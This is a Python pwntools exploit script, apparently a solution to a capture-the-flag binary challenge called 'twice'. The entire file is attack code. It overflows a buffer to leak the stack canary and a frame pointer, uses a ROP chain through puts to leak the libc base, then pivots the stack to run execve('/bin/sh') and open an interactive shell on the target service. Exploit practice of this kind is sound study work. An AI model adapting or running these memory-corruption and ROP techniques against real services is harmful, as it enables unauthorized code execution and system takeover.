from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator', '-e']


elf = ELF("./twice")
libc = elf.libc

#p = process("./twice")
p=remote("127.0.0.1",9999)
p.recvuntil(">")

p.send('aaaaaaaa' *11+'a')
p.recvuntil('aaaaaaaa' *11+'a')
canary = u64(p.recv(7).rjust(8,"\x00"))
ebp = u64(p.recvuntil("\x7f")+"\x00\x00")  

print hex(canary)
print hex(ebp)

# ROPgadget --binary twice --only "pop|ret" | grep rdi
pop_rdi_ret=0x400923
leave=0x400879
fun_addr=0x4007A9
stack=ebp-0x70
payload='11111111'+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(pop_rdi_ret)+p64(1)+p64(fun_addr)+4 * '11111111'+p64(canary)+p64(stack)+p64(leave)

#gdb.attach(p,"b *0x400835")
p.send(payload)
libc.address = u64(p.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
success("libc.address -> {:#x}".format(libc.address))

p.recv()

# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
# pop rdx ; pop rsi ; ret
pop_rdx_pop_rsi_ret=libc.address+0x1150c9
payload='22222222'+p64(pop_rdi_ret)+p64(next(libc.search("/bin/sh")))+p64(pop_rdx_pop_rsi_ret)+p64(0)+p64(0)+p64(libc.sym['execve'])+ '22222222'*4+p64(canary)+p64(stack - 0x30)+p64(leave)
#gdb.attach(p)
p.send(payload)

p.recv()
p.interactive()